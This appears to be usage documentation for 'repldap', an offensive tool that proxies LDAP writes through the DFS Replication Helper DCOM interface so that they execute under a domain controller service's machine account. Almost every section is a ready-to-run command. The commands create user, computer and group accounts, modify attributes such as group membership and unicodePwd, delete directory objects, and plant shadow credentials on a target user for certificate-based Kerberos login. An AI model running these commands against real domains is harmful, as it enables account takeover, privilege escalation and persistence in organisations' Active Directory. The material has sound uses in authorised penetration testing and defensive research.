# 🗃️ Proxied LDAP (repldap)

**Protocols**: [MS-DFSRH](https://winprotocoldocs-bhdugrdyduf5h2e4.b02.azurefd.net/MS-DFSRH/%5bMS-DFSRH%5d.pdf).

`repldap` proxies LDAP write operations through the DFSRH `IADProxy2` DCOM interface. The target's DfsrHelper service executes each LDAP command under its own machine account. This is useful when direct LDAP (TCP/389) is blocked but RPC is accessible on an arbitrary server and the caller can invoke the DFSRH service. For more information on this primitive read [Helping a Little Too Much: The DFS Replication Helper](https://ginpacket.gitbook.io/docs/articles/helping-a-little-too-much).

All write subcommands require `--target-dc` (the FQDN of the DC that will execute the LDAP operation).

## Usage

### create user

**Syntax:**
```bash
./repldap [auth_flags] --target-dc <fqdn> create user --name <cn> --parent-dn <dn> [--pass <password>] [--enabled]
```

**Create a new user account:**

{% hint style="info" %}
Created disabled if `--pass` is omitted.
{% endhint %}

```bash
./repldap [auth_flags] --target-dc dc01.domain.local create user --name sampleuser --parent-dn 'CN=Users,DC=domain,DC=local' --pass 'P@ssw0rd!'
```

### create computer

**Syntax:**
```bash
./repldap [auth_flags] --target-dc <fqdn> create computer --name <cn> --parent-dn <dn> [--pass <password>]
```

**Create a machine account:**

{% hint style="info" %}
The trailing `$` is appended to `sAMAccountName` automatically if not provided.
{% endhint %}

```bash
./repldap [auth_flags] --target-dc dc01.domain.local create computer --name PENTEST --parent-dn 'CN=Computers,DC=domain,DC=local'
```

### create group

**Syntax:**
```bash
./repldap [auth_flags] --target-dc <fqdn> create group --name <cn> --parent-dn <dn> [--type <group-type>]
```

**Create a group:**

{% hint style="info" %}
Available types: `GlobalSecurity`, `GlobalDistribution`, `DomainLocalSecurity`, `DomainLocalDistribution`, `UniversalSecurity`, `UniversalDistribution`.
{% endhint %}

```bash
./repldap [auth_flags] --target-dc dc01.domain.local create group --name Pentesters --parent-dn 'CN=Users,DC=domain,DC=local'
```

### create ou

**Syntax:**
```bash
./repldap [auth_flags] --target-dc <fqdn> create ou --name <name> --parent-dn <dn>
```

**Create an Organizational Unit:**

```bash
./repldap [auth_flags] --target-dc dc01.domain.local create ou --name RedTeam --parent-dn 'DC=domain,DC=local'
```

### create container

**Syntax:**
```bash
./repldap [auth_flags] --target-dc <fqdn> create container --name <name> --parent-dn <dn>
```

**Create a container object:**

```bash
./repldap [auth_flags] --target-dc dc01.domain.local create container --name TestContainer --parent-dn 'DC=domain,DC=local'
```

### create custom

**Syntax:**
```bash
./repldap [auth_flags] --target-dc <fqdn> create custom [<distinguished-name>] [--template <file.yaml>] [--attr <name=value>]
```

**Create an arbitrary AD object from a YAML template:**

```bash
./repldap [auth_flags] --target-dc dc01.domain.local create custom --template myobject.yaml
```

**Create an arbitrary AD object using inline flags:**

```bash
./repldap [auth_flags] --target-dc dc01.domain.local create custom 'CN=Foo,DC=domain,DC=local' --attr objectClass=top --attr description=hello
```

Template schema:

```yaml
parentDN: "CN=Users,DC=example,DC=com"
rdn: "CN=MyObject"
attributes:
  - name: objectClass
    values: ["top", "person"]
  - name: description
    value: "created via repldap create custom"
  - name: someBinary
    type: hex
    value: "deadbeef"
```

Attribute types: `string` (default) | `hex` | `base64`. Use either `value` (single) or `values` (multi-valued), not both.

### modify

**Syntax:**
```bash
./repldap [auth_flags] --target-dc <fqdn> modify <distinguished-name> [--add <name=value>] [--replace <name=value>] [--delete <name>]
```

**Add an attribute value:**

```bash
./repldap [auth_flags] --target-dc dc01.domain.local modify 'CN=User,CN=Users,DC=domain,DC=local' --add description='added via repldap'
```

**Replace an attribute value:**

```bash
./repldap [auth_flags] --target-dc dc01.domain.local modify 'CN=User,CN=Users,DC=domain,DC=local' --replace description='new value'
```

**Delete an attribute (all values):**

```bash
./repldap [auth_flags] --target-dc dc01.domain.local modify 'CN=User,CN=Users,DC=domain,DC=local' --delete description
```

**Combine add and delete in one call:**

```bash
./repldap [auth_flags] --target-dc dc01.domain.local modify 'CN=User,CN=Users,DC=domain,DC=local' --add member='CN=NewUser,CN=Users,DC=domain,DC=local' --delete description
```

**Type hints for binary values (`:b64` / `:base64` or `:x` / `:hex`):**

```bash
./repldap [auth_flags] --target-dc dc01.domain.local modify 'CN=User,CN=Users,DC=domain,DC=local' --replace 'unicodePwd:hex=0a1b2c...'
```

### delete

**Syntax:**
```bash
./repldap [auth_flags] --target-dc <fqdn> delete <distinguished-name>
```

**Delete an AD object:**

```bash
./repldap [auth_flags] --target-dc dc01.domain.local delete 'CN=OldUser,CN=Users,DC=domain,DC=local'
```

### keycred add

**Syntax:**
```bash
./repldap [auth_flags] --target-dc <fqdn> keycred add <distinguished-name> [--out-pfx <file>] [--out-cert <file>] [--subject <cn>] [--device-id <guid>] [--key-size <bits>] [--pfx-password <pass>]
```

**Add a key credential (shadow credential) to an object via IADProxy2:**

{% hint style="info" %}
Generates an RSA key pair and certificate, creates a KeyCredentialLink blob, and appends it to `msDS-KeyCredentialLink`. Use the generated PFX with certificate-based Kerberos authentication.
{% endhint %}

```bash
./repldap [auth_flags] --target-dc dc01.domain.local keycred add 'CN=targetuser,CN=Users,DC=domain,DC=local' --out-pfx targetuser.pfx
```

### keycred clear

**Syntax:**
```bash
./repldap [auth_flags] --target-dc <fqdn> keycred clear <distinguished-name>
```

**Remove all key credentials from an object:**

```bash
./repldap [auth_flags] --target-dc dc01.domain.local keycred clear 'CN=targetuser,CN=Users,DC=domain,DC=local'
```
